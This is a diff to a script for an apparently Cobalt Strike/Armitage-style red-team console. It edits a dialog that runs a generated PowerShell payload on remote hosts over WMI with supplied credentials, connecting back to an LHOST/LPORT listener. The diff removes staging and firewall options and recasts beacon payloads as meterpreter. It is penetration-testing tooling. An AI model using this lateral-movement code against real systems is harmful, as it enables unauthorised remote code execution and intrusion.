@@ -370,7 +370,7 @@ sub wmi_dialog {
     $beacon_id = $1;
 
     # main title and dimensions of the dialog box
-    $dialog = dialog("WMI (PowerShell)", 590, 340);
+    $dialog = dialog("WMI (PowerShell)", 590, 265);
 
     # build out the option list table for the specified payload
     $model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
@@ -379,8 +379,6 @@ sub wmi_dialog {
     [$model _addEntry: %(Option => "RHOST +", Tooltip => "RHOST to target", Hide => '0')];
     [$model _addEntry: %(Option => "RemoteUser", Tooltip => "Remote user account to use for login (optional)", Hide => '0')];
     [$model _addEntry: %(Option => "RemotePass", Tooltip => "Remote password to use for login (optional)", Hide => '0')];
-    [$model _addEntry: %(Option => "PoshHostPort", Value => "8000", Tooltip => "Port on the pivot machine to stage the PowerShell", Hide => '0')];
-    [$model _addEntry: %(Option => "PoshHostTime", Value => "30", Tooltip => "Time in seconds to host the PowerShell payload", Hide => '0')];
     [$model _addEntry: %(Option => "Payload +", Tooltip => "payload to use (if applicable)", Hide => '0')];
     [$model _addEntry: %(Option => "LHOST", Value => lhost(), Tooltip => "LHOST to connect back to", Hide => '0')];
     [$model _addEntry: %(Option => "LPORT", Tooltip => "LPORT to connect back to", Hide => '0')];
@@ -396,7 +394,7 @@ sub wmi_dialog {
     [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
 
     # [$south setLayout: [new GridLayout: 3, 1]]; # original -> more rows
-    [$south setLayout: [new GridLayout: 3, 1]];
+    [$south setLayout: [new GridLayout: 2, 1]];
 
     $c = [new JPanel];
     [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
@@ -405,9 +403,6 @@ sub wmi_dialog {
     $executeButton = [new JButton: "Execute"];
     $listenerButton = [new JButton: "Use Listener"];
     $cancelButton = [new JButton: "Cancel"];
-
-    # selected if the user wants to add/remove a firewall rule automatically
-    $firewallCheckBox = [new JCheckBox: "Add/Remove Firewall Rule"];
 
     # selected if the user wants use the RunWOW64 version of PowerShell
     $runwowCheckBox = [new JCheckBox: "RunWOW64"];
@@ -425,7 +420,7 @@ sub wmi_dialog {
         }
 
         # kick off out payload generation and delivery
-        executeWMI($beacon_id, $options["RHOST +"], $options["RemoteUser"], $options["RemotePass"], $options["PoshHostPort"], $options["PoshHostTime"], $options["Payload +"], $options["LHOST"], $options["LPORT"], [$firewallCheckBox isSelected], [$runwowCheckBox isSelected]);
+        executeWMI($beacon_id, $options["RHOST +"], $options["RemoteUser"], $options["RemotePass"], $options["Payload +"], $options["LHOST"], $options["LPORT"], [$runwowCheckBox isSelected]);
         [$dialog setVisible: 0]; # close the dialog off
         })];
 
@@ -440,7 +435,6 @@ sub wmi_dialog {
     [$c add: $executeButton];
     [$c add: $listenerButton];
     [$c add: $cancelButton];
-    [$south add: left($firewallCheckBox)];
     [$south add: left($runwowCheckBox)];
     [$south add: $c];
 
@@ -471,29 +465,27 @@ sub wmi_dialog {
 #       $2 : RHOST
 #       $3 : RemoteUser
 #       $4 : RemotePass
-#       $5 : PoshHostPort
-#       $6 : PoshHostTime
-#       $7 : Payload
-#       $8 : LHOST
-#       $9 : LPORT
-#       $10 : firewallCheckBox
-#       $11 : RunWOW64
+#       $5 : Payload
+#       $6 : LHOST
+#       $7 : LPORT
+#       $8 : RunWOW64
 sub executeWMI {
     
     $beacon_id = $1;
     $RHOST = $2;
     $RemoteUser = $3;
     $RemotePass = $4;
-    $PoshHostPort = $5;
-    $PoshHostTime = $6;
-    $Payload = $7;
-    $LHOST = $8;
-    $LPORT = $9;
-    $FirewallCheckBox = $10;
-    $RunWOW64 = $11;
+    $Payload = $5;
+    $LHOST = $6;
+    $LPORT = $7;
+    $RunWOW64 = $8;
 
     # get RHOSTS into the form needed
     $RHOST = "\"".replace($RHOST, ", ", "\",\"")."\"";
+
+    # temporary fix - cast beacon_http to meterpreter/reverse_http
+    $Payload = strrep($Payload, "beacon_https", "meterpreter");
+    $Payload = strrep($Payload, "beacon_http", "meterpreter");
 
     # generate the PowerShell payload with our given parameters
     $payload = generate($Payload, $LHOST, $LPORT, %(), "powershell");
